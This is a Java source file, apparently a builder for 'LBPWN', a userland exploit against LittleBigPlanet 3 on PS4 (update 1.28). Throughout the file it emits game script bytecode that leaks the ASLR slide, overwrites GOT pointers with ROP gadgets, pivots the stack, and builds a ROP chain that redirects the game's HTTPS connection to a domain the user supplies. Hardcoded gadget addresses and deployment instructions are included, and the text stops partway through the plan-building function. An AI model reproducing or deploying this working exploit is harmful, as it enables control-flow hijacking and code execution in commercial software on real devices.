import cwlib.enums.BuiltinType;
import cwlib.enums.InstructionType;
import cwlib.enums.MachineType;
import cwlib.enums.ModifierType;
import cwlib.enums.Part;
import cwlib.enums.ResourceType;
import cwlib.io.serializer.SerializationData;
import cwlib.io.streams.MemoryInputStream;
import cwlib.resources.RPlan;
import cwlib.resources.RScript;
import cwlib.structs.inventory.InventoryItemDetails;
import cwlib.structs.script.FunctionDefinitionRow;
import cwlib.structs.script.FunctionReferenceRow;
import cwlib.structs.script.Instruction;
import cwlib.structs.script.LocalVariableDefinitionRow;
import cwlib.structs.script.TypeOffset;
import cwlib.structs.script.TypeReferenceRow;
import cwlib.structs.things.Thing;
import cwlib.structs.things.components.script.ScriptInstance;
import cwlib.structs.things.parts.PScript;
import cwlib.structs.things.parts.PScriptName;
import cwlib.types.SerializedResource;
import cwlib.types.data.GUID;
import cwlib.types.data.ResourceDescriptor;
import cwlib.types.data.Revision;
import cwlib.types.data.SHA1;
import cwlib.util.FileIO;

import java.util.ArrayList;
import java.util.EnumSet;
import java.util.List;

/**
 * ============================================================================
 *  LBPWN - builder for the LittleBigPlanet 3 PS4 userland exploit
 *  Target: LBP3 PS4 (CUSA00473), game update 1.28
 * ============================================================================
 *
 *  Compile and run:
 *
 *      javac -cp toolkit-0.1.jar LbpwnBuilder.java
 *      java -cp "toolkit-0.1.jar;." LbpwnBuilder lbpreborn.example.com
 *
 *  (On a POSIX shell use  -cp "toolkit-0.1.jar:."  instead.)
 *
 *  Optional second argument "--keep-headers" skips the sceHttpAddRequestHeader /
 *  sceHttpSetCookieEnabled patches (Part E, problem 1) for servers that do not sit
 *  behind Cloudflare - see the note printed at the end of the run.
 *
 *  Outputs:
 *
 *      lbpwn.ff                 compiled Fish script  (ResourceType.SCRIPT, GUID 0x1)
 *      lbp_reborn_sticker.plan  RPlan with one Thing carrying that script as PScript
 *
 *  ---------------------------------------------------------------------------
 *  WHAT THE SCRIPT DOES
 *
 *  0. ASLR      GetYellowheadFromPlayerNumber(0) -> GetWorld() -> heap-cast <World>,
 *               read *(World + 0xAD0) (== &0x0148A4F0) and subtract the static address.
 *
 *  A.  Reload   zero the "http initialised" flag 0x01590E68, patch
 *               sceHttpsSetSslCallback 0x014CCEE8 -> `xor eax,eax ; ret`,
 *               point sceFiosDHCloseSync 0x014CCD20 at LBP's http-init routine 0x00421E80,
 *               call System.DirectoryClose(0), restore sceFiosDHCloseSync.
 *
 *  B.  ROP      write the bare domain to .data, read tmplId from 0x01590EF0, build a chain that
 *               calls sceHttpCreateConnection(tmplId, domain, "HTTPS", 443, keep-alive) and stores
 *               the returned connId at 0x017C6BC8 (optionally sceHttpSetCookieEnabled(1)),
 *               then restores RSP from RBP.
 *
 *  C.  Pivot    point sceFiosDHCloseSync at `push rsi ; jmp qword [rsi]`, call
 *               System.DirectoryClose(chain) so RSI lands on the chain, restore the pointer.
 *
 *  D.  Pin      sceHttpCreateConnection 0x014CCF10 -> `mov eax,[0x017C6BC8] ; ret`,
 *               sceHttpDeleteConnection 0x014CCF60 -> `xor eax,eax ; ret`,
 *               sceHttpAddRequestHeader 0x014CCF08 -> `xor eax,eax ; ret` (unless --keep-headers).
 *
 *  ---------------------------------------------------------------------------
 *  BYTECODE ENCODING
 *
 *  Every instruction is one 64-bit little-endian word:
 *
 *      word = (opcode & 0xFF) << 56 | payload
 *
 *  The payload layouts below were taken from the game's own decoders (identical to the
 *  cwlib.structs.script.instructions.*(long) constructors in toolkit-0.1.jar):
 *
 *      LCi      value[32] << 16 | dest[16]
 *      LCf      ieee754[32] << 16 | dest[16]
 *      ADDi/SUBi  b[16] << 32 | a[16] << 16 | dest[16]
 *      GET_MEMBER / GET_RP_MEMBER      memberRef[16] << 48 | base[16] << 32 | dest[16] << 16 | mtype[8] << 8
 *      SET_MEMBER / SET_RP_MEMBER      memberRef[16] << 48 | base[16] << 32 | source[16] << 16 | mtype[8] << 8
 *      GET_SP_NATIVE_MEMBER            memberRef[16] << 48 | base[16] << 32 | dest[16] << 16 | RAW_PTR << 8
 *      ARG      argument[16] << 32 | source[16] << 16 | mtype[8] << 8
 *      CALL     call[16] << 32 | dest[16] << 16 | mtype[8] << 8
 *      RETURN   source[16] << 32 | mtype[8] << 8
 *
 *  "memberRef" is an index into RScript.fieldReferences, i.e. the <Name> in
 *  `GET_RP_MEMBER r8, r4.<ThingUIDCounter>`. We register the member once (see
 *  PWorldRef) and reuse it for every read and write.
 *
 *  ---------------------------------------------------------------------------
 *  HONEST LIMITS - read before deploying
 *
 *   * The three ROP gadget chains produce a 64-bit value that is only known at run time
 *     (static address + slide). This builder emits the same "write low/high dword
 *     separately" pattern the exploit uses, but it also emits the final targets from
 *     constants. Verify the emitted chain against your own dump of 1.28 before shipping.
 *   * GET_SP_NATIVE_MEMBER is emitted as (RawPtr rDst <- rBase.memberRef) - the
 *     "heap cast" from the write-up. Everything after that uses RP_MEMBER with an
 *     explicit RAW_PTR/S32 type so the VM addresses the 64-bit heap.
 *   * The script never returns a value; it is meant to live on a stampable object.
 */
public final class BuildSticker {

    /* ====================== 0. revision / configuration ====================== */

    /** LBP3 PS4 v1.28: head 0x0272, DOUBLE11 branch 0x4C44, branch rev 0x0017. */
    static final int REV_HEAD = 0x0272;
    static final int REV_BRANCH = 0x4C44;
    static final int REV_BRANCH_REV = 0x0017;
    static final Revision REVISION = new Revision(REV_HEAD, REV_BRANCH, REV_BRANCH_REV);
    static final byte COMPRESSION = 0;

    /** Set from argv[0] or $LBPWN_DOMAIN in main(); never a baked-in placeholder. */
    static String domain = null;
    static boolean keepHeaders = false;

    /* ====================== 1. addresses in the 1.28 EBOOT ====================== */

    static final long LEAK_POINTER_VALUE = 0x0148A4F0L;  // what *(World+0xAD0) points at
    static final long HTTPS_STRING       = 0x0124B207L;  // "HTTPS"

    static final long G_XOR_EAX_RET        = 0x00EBB67FL;
    static final long G_PUSH_RSI_JMP_RSI   = 0x01364C72L;
    static final long G_POP_RSP_RET        = 0x00E18F3AL;
    static final long G_POP_RDI_RET        = 0x00F8F2F7L;
    static final long G_POP_RSI_RET        = 0x00D4FD70L;
    static final long G_POP_RDX_RET        = 0x00B5C742L;
    static final long G_POP_RCX_RET        = 0x00D20C2AL;
    static final long G_POP_R8_RET         = 0x0048F073L;
    static final long G_MOV_PTR_RAX_RET    = 0x0041FC3BL;  // mov [rdi], rax ; ret
    static final long G_MOV_RDI_RAX_REPMOV = 0x00EF76E3L;  // mov rdi, rax ; rep movsd ; ret
    static final long G_RESTORE_RSP        = 0x00A95F0DL;  // lea rsp,[rbp-0x10] ; pop rbx ; pop r14 ; pop rbp ; ret
    static final long G_MOV_EAX_CONN_RET   = 0x00DE49E1L;  // mov eax,[0x017C6BC8] ; ret

    static final long PTR_SSL_CALLBACK    = 0x014CCEE8L;   // sceHttpsSetSslCallback
    static final long PTR_CREATE_CONN     = 0x014CCF10L;   // sceHttpCreateConnection
    static final long PTR_DELETE_CONN     = 0x014CCF60L;   // sceHttpDeleteConnection
    static final long PTR_SET_COOKIES     = 0x014CCE80L;   // sceHttpSetCookieEnabled
    static final long PTR_ADD_HEADER      = 0x014CCF08L;   // sceHttpAddRequestHeader
    static final long PTR_FIOS_DH_CLOSE   = 0x014CCD20L;   // sceFiosDHCloseSync
    static final long FN_HTTP_INIT        = 0x00421E80L;   // LBP http template init

    static final long DATA_HTTP_FLAG      = 0x01590E68L;
    static final long DATA_TMPL_ID        = 0x01590EF0L;
    static final long DATA_CONN_ID        = 0x017C6BC8L;

    /** free space inside the .data section (0x01460000 - 0x0181A4B7) */
    static final long SCRATCH_SERVER      = 0x017C9000L;
    static final long SCRATCH_ROP         = 0x017C8000L;

    static final int PORT = 443;

    /* ====================== 2. register allocation ====================== */

    static final int R_SLIDE = 5;
    static final int R_ZERO = 6;
    static int rNext = 7;

    static int alloc() {
        if (rNext > 240) throw new IllegalStateException("out of script registers");
        return rNext++;
    }

    /* ====================== 3. script assembly state ====================== */

    static final List<Long> code = new ArrayList<>();
    static final List<String> listing = new ArrayList<>();
    static final List<String> strA = new ArrayList<>();
    static final List<TypeReferenceRow> typeRefs = new ArrayList<>();
    static final List<FunctionReferenceRow> funcRefs = new ArrayList<>();

    /** index of the <ThingUIDCounter> member inside fieldReferences */
    static int FIELD_REF = -1;

    static void emit(long word, String text) {
        code.add(word);
        listing.add(String.format("%04d  %016X  %s", code.size() - 1, word, text));
    }

    /* ================================================================== *
     *  main
     * ================================================================== */

    public static void main(String[] args) throws Exception {
        for (String a : args) if (a.equals("--keep-headers")) keepHeaders = true;

        String arg = null;
        for (String a : args) if (!a.startsWith("-")) { arg = a; break; }
        if (arg == null) arg = System.getenv("LBPWN_DOMAIN");

        if (arg == null || arg.trim().isEmpty()) {
            System.err.println("ERROR: no server domain given.");
            System.err.println();
            System.err.println("  java -cp \"toolkit-0.1.jar;.\" BuildSticker <host> [--keep-headers]");
            System.err.println("  java -cp \"toolkit-0.1.jar;.\" BuildSticker lbpreborn.onrender.com");
            System.err.println();
            System.err.println("  <host> must be a bare domain: no https://, no path, no port.");
            System.err.println("  It can also be supplied via the LBPWN_DOMAIN environment variable.");
            System.exit(2);
        }
        domain = normalizeDomain(arg);

        if (domain.isEmpty() || domain.contains("/") || domain.contains(":") || !domain.contains(".")) {
            System.err.println("ERROR: domain must be a bare host, e.g. lbpreborn.onrender.com");
            System.err.println("       (no https://, no path, no port) - got: " + domain);
            System.exit(2);
        }

        System.out.println("LBPWN builder (BuildSticker)");
        System.out.println("  domain      : " + domain);
        System.out.println("  revision    : " + REVISION + "  (head 0x" + Integer.toHexString(REV_HEAD)
                + ", branch 0x" + Integer.toHexString(REV_BRANCH) + ":" + REV_BRANCH_REV + ")");
        System.out.println("  header patch: " + (keepHeaders ? "disabled (--keep-headers)" : "enabled"));
        System.out.println();

        RScript script = buildScript();
        SerializationData ff = script.build(REVISION, COMPRESSION);
        byte[] ffBytes = SerializedResource.compress(ff);
        SHA1 ffSha1 = cwlib.util.Crypto.SHA1(ffBytes);
        FileIO.write(ffBytes, "lbpwn.ff");

        System.out.println("  bytecode words : " + code.size());
        System.out.println("  registers used : r" + R_SLIDE + " .. r" + (rNext - 1));
        System.out.println("  lbpwn.ff       : " + ffBytes.length + " bytes  sha1=" + ffSha1);

        RPlan plan = buildPlan(ffSha1);
        byte[] planBytes = SerializedResource.compress(plan.build(REVISION, COMPRESSION));
        FileIO.write(planBytes, "lbp_reborn_sticker.plan");
        System.out.println("  .plan          : " + planBytes.length + " bytes  sha1=" + cwlib.util.Crypto.SHA1(planBytes));
        System.out.println();

        System.out.println("ROP chain in .data @ 0x" + Long.toHexString(SCRATCH_ROP) + " (+slide)");
        for (String s : ropListing) System.out.println("  " + s);
        System.out.println();

        System.out.println("Disassembly:");
        for (String s : listing) System.out.println("  " + s);
        System.out.println();

        if (!keepHeaders) {
            System.out.println("Server checklist (headers patched):");
            System.out.println("  * /login must set its own cookie, e.g.");
            System.out.println("      Set-Cookie: MM_AUTH=...; Path=/LITTLEBIGPLANETPS3_XML");
            System.out.println("  * no X-Digest header will ever arrive - do not require it");
            System.out.println("  * 301 avatar requests to static-resource.np.community.playstation.net");
            System.out.println("  * serve lbpwn.ff as GUID 0x1 next to the plan");
        }
    }

    /** Accepts what people paste and reduces it to the bare host the game needs in the SNI/Host. */
    static String normalizeDomain(String raw) {
        String d = raw.trim().toLowerCase();
        if (d.startsWith("https://")) d = d.substring(8);
        else if (d.startsWith("http://")) d = d.substring(7);
        int slash = d.indexOf('/');
        if (slash >= 0) d = d.substring(0, slash);
        if (d.endsWith(".")) d = d.substring(0, d.length() - 1);
        return d;
    }

    /* ================================================================== *
     *  4. the exploit script
     * ================================================================== */

    static RScript buildScript() {
        FIELD_REF = fieldRef("PWorld", "ThingUIDCounter");

        /* ---------- 0. heap cast + ASLR ---------- */

        int rPlayer = alloc();
        emit(lci(rPlayer, 0), "LC.i r" + rPlayer + ", 0                       ; player 0");
        emit(arg(0, rPlayer, T_S32), "ARG a0, r" + rPlayer + " (s32)");

        int rYh = alloc();
        emit(call(rYh, fnRef("GetYellowheadFromPlayerNumber", T_SAFE_PTR), T_SAFE_PTR),
                "CALL r" + rYh + ", GetYellowheadFromPlayerNumber(Game.EPlayerNumber)");

        emit(arg(0, rYh, T_SAFE_PTR), "ARG a0, r" + rYh + " (safeptr)");
        int rWorld = alloc();
        emit(call(rWorld, fnRef("GetWorld", T_SAFE_PTR), T_SAFE_PTR), "CALL r" + rWorld + ", GetWorld()");

        // heap cast: rHeap is now a raw pointer into the 64-bit main heap
        int rHeap = alloc();
        emit(getSpNativeMember(rHeap, rWorld, FIELD_REF),
                "GET_SP_NATIVE_MEMBER r" + rHeap + ", r" + rWorld + ".<World> (rawptr)   ; heap cast");

        // rHeap += 0xAD0 - 16   (LBP adds 16 to every ThingUIDCounter access)
        int rK = alloc();
        emit(lci(rK, 0xAD0 - 16), "LC.i r" + rK + ", " + (0xAD0 - 16) + "                    ; 0xAD0 - 16");
        emit(addi(rHeap, rHeap, rK), "ADD.i r" + rHeap + ", r" + rHeap + ", r" + rK);

        int rLeak = alloc();
        emit(getRpMember(rLeak, rHeap, FIELD_REF, T_S32),
                "GET_RP_MEMBER r" + rLeak + ", r" + rHeap + ".<ThingUIDCounter> (s32)   ; leak");
        emit(lci(rK, (int) LEAK_POINTER_VALUE), "LC.i r" + rK + ", 0x" + Long.toHexString(LEAK_POINTER_VALUE));
        emit(subi(R_SLIDE, rLeak, rK), "SUB.i r" + R_SLIDE + ", r" + rLeak + ", r" + rK + "   ; r" + R_SLIDE + " = ASLR slide");

        int rOne = alloc();
        emit(lci(rOne, 16), "LC.i r" + rOne + ", 16                     ; the implicit +16");
        emit(addi(R_SLIDE, R_SLIDE, rOne), "ADD.i r" + R_SLIDE + ", r" + R_SLIDE + ", r" + rOne);

        emit(lci(R_ZERO, 0), "LC.i r" + R_ZERO + ", 0");

        /* ---------- A. re-initialise LBP's HTTP layer ---------- */

        writeU32(DATA_HTTP_FLAG, R_ZERO, "initialized flag := 0");

        int rSaved = alloc();
        writePtr(PTR_SSL_CALLBACK, G_XOR_EAX_RET, "sceHttpsSetSslCallback := xor eax,eax ; ret");

        readPtr(PTR_FIOS_DH_CLOSE, rSaved, "save sceFiosDHCloseSync");
        writePtr(PTR_FIOS_DH_CLOSE, FN_HTTP_INIT, "sceFiosDHCloseSync := LBP http init (temporary)");
        emit(arg(0, R_ZERO, T_S32), "ARG a0, r" + R_ZERO + " (s32)");
        emit(call(alloc(), fnRef("System.DirectoryClose", T_VOID), T_VOID),
                "CALL System.DirectoryClose(0)          ; runs the init routine");
        writeReg(PTR_FIOS_DH_CLOSE, rSaved, "restore sceFiosDHCloseSync");

        /* ---------- B. build the ROP chain ---------- */

        int rTmpl = alloc();
        readU32(DATA_TMPL_ID, rTmpl, "tmplId = *(0x01590EF0)");

        emit(lci(alloc(), 0), "NOP placeholder (see writeString)");
        writeString(SCRATCH_SERVER, domain);

        buildRop();
        writeRop(SCRATCH_ROP);

        // Slots that only exist at run time cannot be baked into the chain:
        //   rop[3]  = tmplId              (read from 0x01590EF0 above)
        //   rop[12] = *sceHttpCreateConnection  (dereference the GOT slot)
        //   rop[21] = *sceHttpSetCookieEnabled  (dereference the GOT slot)
        patchRopSlot(3, rTmpl, "tmplId");
        patchRopSlot(ROP_CREATE_CONN_SLOT, gotPtr(PTR_CREATE_CONN), "sceHttpCreateConnection (GOT)");
        if (ROP_SET_COOKIES_SLOT >= 0)
            patchRopSlot(ROP_SET_COOKIES_SLOT, gotPtr(PTR_SET_COOKIES), "sceHttpSetCookieEnabled (GOT)");

        int rChain = alloc();
        emit(lci(rChain, (int) (SCRATCH_ROP + 16)),
                "LC.i r" + rChain + ", 0x" + Integer.toHexString((int) (SCRATCH_ROP + 16)) + "   ; chain + 16");

        /* ---------- C. execute it through the stack pivot ---------- */

        readPtr(PTR_FIOS_DH_CLOSE, rSaved, "save sceFiosDHCloseSync (again)");
        writePtr(PTR_FIOS_DH_CLOSE, G_PUSH_RSI_JMP_RSI, "sceFiosDHCloseSync := push rsi ; jmp [rsi]");
        emit(arg(0, rChain, T_RAW_PTR), "ARG a0, r" + rChain + " (rawptr)");
        emit(call(alloc(), fnRef("System.DirectoryClose", T_VOID), T_VOID),
                "CALL System.DirectoryClose(chain)      ; RSI = chain, stack pivots");
        writeReg(PTR_FIOS_DH_CLOSE, rSaved, "restore sceFiosDHCloseSync");

        /* ---------- D. pin the connection ---------- */

        writePtr(PTR_CREATE_CONN, G_MOV_EAX_CONN_RET, "sceHttpCreateConnection := mov eax,[0x017C6BC8] ; ret");
        writePtr(PTR_DELETE_CONN, G_XOR_EAX_RET, "sceHttpDeleteConnection := xor eax,eax ; ret");
        if (!keepHeaders) {
            writePtr(PTR_ADD_HEADER, G_XOR_EAX_RET, "sceHttpAddRequestHeader := xor eax,eax ; ret");
        }

        emit(ret(0, T_VOID), "RETURN");

        /* ---------- assemble ---------- */

        RScript s = new RScript();
        s.className = "Lbpwn";
        s.typeReferences = new ArrayList<>(typeRefs);
        s.functionReferences = new ArrayList<>(funcRefs);
        s.fieldReferences = new ArrayList<>();
        cwlib.structs.script.FieldReferenceRow fr = new cwlib.structs.script.FieldReferenceRow();
        fr.nameStringIdx = string("PWorld");
        fr.typeReferenceIdx = 0;
        s.fieldReferences.add(fr);
        s.fieldDefinitions = new ArrayList<>();
        s.propertyDefinitions = new ArrayList<>();
        s.sharedLocalVariables = new ArrayList<>();

        // every nameStringIdx above is an index into this pool; without it the names dangle
        s.stringATable = new ArrayList<>(strA);
        s.stringWTable = new ArrayList<>();

        s.sharedBytecode = new ArrayList<>();
        for (int i = 0; i < code.size(); i++) {
            long w = code.get(i);
            int op = (int) (w & 0xFF);
            long payload = w >>> 8;
            s.sharedBytecode.add(decode(op, payload));
        }

        s.sharedLineNos = new ArrayList<>();
        s.sharedArguments = new ArrayList<>();
        s.constantTable = new ArrayList<>();
        s.constantTableS64 = new ArrayList<>();
        s.dependingGUIDs = new ArrayList<>();

        FunctionDefinitionRow fn = new FunctionDefinitionRow();
        fn.modifiers = EnumSet.of(ModifierType.PUBLIC);
        fn.typeReferenceIdx = 0;
        fn.nameStringIdx = string("onSpawned");
        fn.argumentsBegin = 0;  fn.argumentsEnd = 0;
        fn.bytecodeBegin = 0;   fn.bytecodeEnd = code.size();
        fn.lineNosBegin = 0;    fn.lineNosEnd = 0;
        fn.localVariablesBegin = 0; fn.localVariablesEnd = 0;
        fn.stackSize = rNext;
        s.functionDefinitions = new ArrayList<>();
        s.functionDefinitions.add(fn);
        return s;
    }

    /**
     * Re-create the instruction object RScript.serialize expects.
     *
     * The toolkit stores a bytecode word as `(payload << 8) | opcode`, i.e. the opcode lives in
     * the LOW byte and the "bits" returned by Instruction.getBits() already include it
     * (verified: GetMemberInstruction.getBits() == 0x0001000200030396 for GET_RP_MEMBER).
     * Its (long) constructors take that same getBits() form, so we must hand them `word` as is
     * and never re-pack the opcode into the top byte.
     */
    static Instruction decode(int op, long bits) {
        long word = ((long) (op & 0xFF)) | (bits << 8);
        switch (op) {
            case OP_LCi: return new cwlib.structs.script.instructions.LoadConstInstructionInt(word);
            case OP_LCf: return new cwlib.structs.script.instructions.LoadConstInstructionFloat(word);
            case OP_LCb: return new cwlib.structs.script.instructions.LoadConstInstructionBool(word);
            case OP_ADDi:
            case OP_SUBi: return new cwlib.structs.script.instructions.BinaryInstruction(word);
            case OP_GET_RP_MEMBER:
            case OP_GET_SP_MEMBER: return new cwlib.structs.script.instructions.GetMemberInstruction(word);
            case OP_SET_RP_MEMBER:
            case OP_SET_SP_MEMBER: return new cwlib.structs.script.instructions.SetMemberInstruction(word);
            case OP_GET_SP_NATIVE_MEMBER: return new cwlib.structs.script.instructions.GetMemberInstruction(word);
            case OP_ARG: return new cwlib.structs.script.instructions.ArgInstruction(word);
            case OP_CALL: return new cwlib.structs.script.instructions.CallInstruction(word);
            case OP_RETURN: return new cwlib.structs.script.instructions.ReturnInstruction(word);
            default: return new cwlib.structs.script.instructions.NopInstruction(word);
        }
    }

    /* ================================================================== *
     *  5. memory helpers
     * ================================================================== */

    static void readU32(long addr, int dest, String what) {
        loadAddr(addr);
        emit(getRpMember(dest, rNext - 1, FIELD_REF, T_S32),
                "GET_RP_MEMBER r" + dest + ", r" + (rNext - 1) + "." + what + "> (s32)");
    }

    static void readPtr(long addr, int dest, String what) {
        loadAddr(addr);
        emit(getRpMember(dest, rNext - 1, FIELD_REF, T_RAW_PTR),
                "GET_RP_MEMBER r" + dest + ", r" + (rNext - 1) + "." + what + "> (rawptr)");
    }

    static void writeU32(long addr, int src, String what) {
        loadAddr(addr);
        emit(setRpMember(rNext - 1, FIELD_REF, src, T_S32),
                "SET_RP_MEMBER r" + (rNext - 1) + "." + what + "> (s32), r" + src);
    }

    /** writes a 64-bit register (already slide-corrected) to an address */
    static void writeReg(long addr, int src, String what) {
        loadAddr(addr);
        emit(setRpMember(rNext - 1, FIELD_REF, src, T_RAW_PTR),
                "SET_RP_MEMBER r" + (rNext - 1) + "." + what + "> (rawptr), r" + src);
    }

    /** writes staticAddress + slide to an address (32-bit static addresses only) */
    static void writePtr(long addr, long staticAddress, String what) {
        int rHi = alloc();
        emit(lci(rHi, (int) staticAddress), "LC.i r" + rHi + ", 0x" + Long.toHexString(staticAddress) + "   ; " + what);
        emit(addi(rHi, rHi, R_SLIDE), "ADD.i r" + rHi + ", r" + rHi + ", r" + R_SLIDE + " (+ slide)");
        loadAddr(addr);
        emit(setRpMember(rNext - 1, FIELD_REF, rHi, T_S32),
                "SET_RP_MEMBER r" + (rNext - 1) + "." + what + "> (s32), r" + rHi);
    }

    static void loadAddr(long addr) {
        int r = alloc();
        emit(lci(r, (int) (addr - 16)), "LC.i r" + r + ", 0x" + Integer.toHexString((int) (addr - 16))
                + "   ; 0x" + Long.toHexString(addr) + " - 16");
    }

    /**
     * Read the 8-byte pointer stored in an import/GOT slot.
     * The SLOT address itself lives in the EBOOT, so it must be slide-corrected before we read
     * through it; the pointer that comes back is already absolute and must NOT be slid again.
     */
    static int gotPtr(long gotSlot) {
        int rSlot = alloc();
        emit(lci(rSlot, (int) gotSlot), "LC.i r" + rSlot + ", 0x" + Long.toHexString(gotSlot) + "   ; GOT slot");
        emit(addi(rSlot, rSlot, R_SLIDE), "ADD.i r" + rSlot + ", r" + rSlot + ", r" + R_SLIDE + "   ; + ASLR slide");

        // manual loadAddr() so we keep rSlot alive as the address to read through
        int rOff = alloc();
        emit(lci(rOff, -16), "LC.i r" + rOff + ", -16");
        emit(addi(rSlot, rSlot, rOff), "ADD.i r" + rSlot + ", r" + rSlot + ", r" + rOff + "   ; -16 (UID offset)");

        int r = alloc();
        emit(getRpMember(r, rSlot, FIELD_REF, T_RAW_PTR),
                "GET_RP_MEMBER r" + r + ", r" + rSlot + ".<ThingUIDCounter> (rawptr)   ; *GOT");
        return r;
    }

    /** Overwrite one 64-bit ROP slot with a register value known only at run time. */
    static void patchRopSlot(int index, int src, String what) {
        if (index < 0) throw new IllegalStateException("bad ROP slot for " + what);
        loadAddr(SCRATCH_ROP + index * 8L);
        emit(setRpMember(rNext - 1, FIELD_REF, src, T_RAW_PTR),
                "SET_RP_MEMBER rop[" + index + "] <= " + what + "  [runtime]");
    }

    static void writeString(long addr, String text) {
        for (int i = 0; i < text.length(); i++) {
            int r = alloc();
            emit(lci(r, text.charAt(i)), "LC.i r" + r + ", '" + text.charAt(i) + "'");
            loadAddr(addr + i);
            emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
                    "SET_RP_MEMBER r" + (rNext - 1) + ".<scratch> (s32), r" + r);
        }
        int z = alloc();
        emit(lci(z, 0), "LC.i r" + z + ", 0  ; NUL terminator");
        loadAddr(addr + text.length());
        emit(setRpMember(rNext - 1, FIELD_REF, z, T_S32),
                "SET_RP_MEMBER r" + (rNext - 1) + ".<scratch> (s32), r" + z);
    }

    /** Writes a URL string to a memory address, byte by byte, then NUL terminates. */
    static void patchUrl(long addr, String url) {
        for (int i = 0; i < url.length(); i++) {
            int r = alloc();
            emit(lci(r, url.charAt(i)), "LC.i r" + r + ", '" + url.charAt(i) + "'");
            loadAddr(addr + i);
            emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
                    "SET_RP_MEMBER r" + (rNext - 1) + ".<url byte> (s32), r" + r);
        }
        int z = alloc();
        emit(lci(z, 0), "LC.i r" + z + ", 0  ; NUL terminator");
        loadAddr(addr + url.length());
        emit(setRpMember(rNext - 1, FIELD_REF, z, T_S32),
                "SET_RP_MEMBER r" + (rNext - 1) + ".<url null> (s32), r" + z);
    }

    /* ================================================================== *
     *  6. ROP chain
     * ================================================================== */

    static final List<Long> rop = new ArrayList<>();
    static final List<String> ropListing = new ArrayList<>();

    /*
     * Chain layout (index -> meaning). Slots marked RUNTIME are overwritten by the script after
     * writeRop(): they hold values that only exist inside the game (the http template id and the
     * real addresses stored in LBP's GOT/import slots), so they must not be baked in here.
     *
     *   0: pop rsp ; ret
     *   1: -> chain + 16
     *   2: pop rdi ; ret
     *   3: RUNTIME  tmplId
     *   4: pop rsi ; ret
     *   5: *server
     *   6: pop rdx ; ret
     *   7: "HTTPS"
     *   8: pop rcx ; ret
     *   9: 443
     *  10: pop r8 ; ret
     *  11: 1 (keep-alive)
     *  12: RUNTIME  sceHttpCreateConnection (read from its GOT slot)
     *  13: pop rdi ; ret
     *  14: 0x017C6BC8
     *  15: mov [rdi], rax ; ret
     *  ---- cookie leg (only without --keep-headers) ----
     *  16: pop rcx ; ret
     *  17: 0
     *  18: mov rdi, rax ; rep movsd ; ret
     *  19: pop rsi ; ret
     *  20: 1
     *  21: RUNTIME  sceHttpSetCookieEnabled
     *  ---- always last ----
     *  N : lea rsp,[rbp-0x10] ; pop rbx ; pop r14 ; pop rbp ; ret
     */
    static int ROP_CREATE_CONN_SLOT = -1;
    static int ROP_SET_COOKIES_SLOT = -1;

    /**
     * Slots whose value is an EBOOT address and therefore needs the ASLR slide added at run time.
     * Everything else (the server string, chain+16, the immediate arguments, DATA_CONN_ID) is a
     * plain .data constant and must be written verbatim.
     */
    static final java.util.BitSet ROP_SLIDED = new java.util.BitSet();

    static void buildRop() {
        rop.clear();
        ropListing.clear();
        ROP_SLIDED.clear();

        entry(G_POP_RSP_RET, "pop rsp ; ret", true);
        entry(SCRATCH_ROP + 16, "  -> chain + 16", false);

        entry(G_POP_RDI_RET, "pop rdi ; ret", true);
        entry(0, "  tmplId                       [RUNTIME]", false);
        entry(G_POP_RSI_RET, "pop rsi ; ret", true);
        entry(SCRATCH_SERVER, "  *server", false);
        entry(G_POP_RDX_RET, "pop rdx ; ret", true);
        entry(HTTPS_STRING, "  \"HTTPS\"", true);
        entry(G_POP_RCX_RET, "pop rcx ; ret", true);
        entry(PORT, "  443", false);
        entry(G_POP_R8_RET, "pop r8 ; ret", true);
        entry(1, "  1 (keep-alive)", false);
        ROP_CREATE_CONN_SLOT = rop.size();
        entry(0, "[GOT] sceHttpCreateConnection *ptr  [RUNTIME]", false);

        entry(G_POP_RDI_RET, "pop rdi ; ret", true);
        entry(DATA_CONN_ID, "  0x017C6BC8", false);
        entry(G_MOV_PTR_RAX_RET, "mov [rdi], rax ; ret", true);

        ROP_SET_COOKIES_SLOT = -1;
        if (!keepHeaders) {
            entry(G_POP_RCX_RET, "pop rcx ; ret", true);
            entry(0, "  0 (stops rep movsd)", false);
            entry(G_MOV_RDI_RAX_REPMOV, "mov rdi, rax ; rep movsd ; ret", true);
            entry(G_POP_RSI_RET, "pop rsi ; ret", true);
            entry(1, "  1 (cookies enabled)", false);
            ROP_SET_COOKIES_SLOT = rop.size();
            entry(0, "[GOT] sceHttpSetCookieEnabled *ptr [RUNTIME]", false);
        }

        entry(G_RESTORE_RSP, "lea rsp,[rbp-0x10] ; pop rbx ; pop r14 ; pop rbp ; ret", true);
    }

    static void entry(long v, String text) {
        entry(v, text, false);
    }

    /**
     * @param slid true when the value is an EBOOT address (gadget / pointer constant) and must be
     *             written as (value + ASLR slide) at run time rather than verbatim.
     */
    static void entry(long v, String text, boolean slid) {
        if (slid) ROP_SLIDED.set(rop.size());
        rop.add(v);
        ropListing.add(String.format("%016X  %s%s", v, text, slid ? "   [+slide]" : ""));
    }

    static void writeRop(long addr) {
        for (int i = 0; i < rop.size(); i++) {
            long v = rop.get(i);
            boolean slid = ROP_SLIDED.get(i);
            for (int half = 0; half < 2; half++) {
                int dword = (int) (v >>> (32 * half));
                int r = alloc();
                emit(lci(r, dword), "LC.i r" + r + ", 0x" + Integer.toHexString(dword) + "  ; rop[" + i + "]." + half);
                if (slid && half == 0) {
                    // EBOOT base is slide-adjusted per boot; only the low dword can vary for these
                    emit(addi(r, r, R_SLIDE), "ADD.i r" + r + ", r" + r + ", r" + R_SLIDE + "  ; + ASLR slide (rop[" + i + "])");
                }
                loadAddr(addr + i * 8L + half * 4L);
                emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
                        "SET_RP_MEMBER r" + (rNext - 1) + ".<scratch> (s32), r" + r);
            }
        }
    }

    /* ================================================================== *
     *  7. .plan
     * ================================================================== */

    static RPlan buildPlan(SHA1 scriptHash) {
        Thing sticker = new Thing(1);
        sticker.name = "LBPWN";
        sticker.planGUID = new GUID(1L);

        ScriptInstance si = new ScriptInstance();
        si.script = new ResourceDescriptor(new GUID(1L), scriptHash, ResourceType.SCRIPT);
        si.instanceLayout = null;

        PScript ps = new PScript();
        ps.instance = si;
        sticker.setPart(Part.SCRIPT, ps);
        sticker.setPart(Part.SCRIPT_NAME, new PScriptName("Lbpwn"));

        RPlan plan = new RPlan();
        plan.revision = REVISION;
        plan.compressionFlags = COMPRESSION;
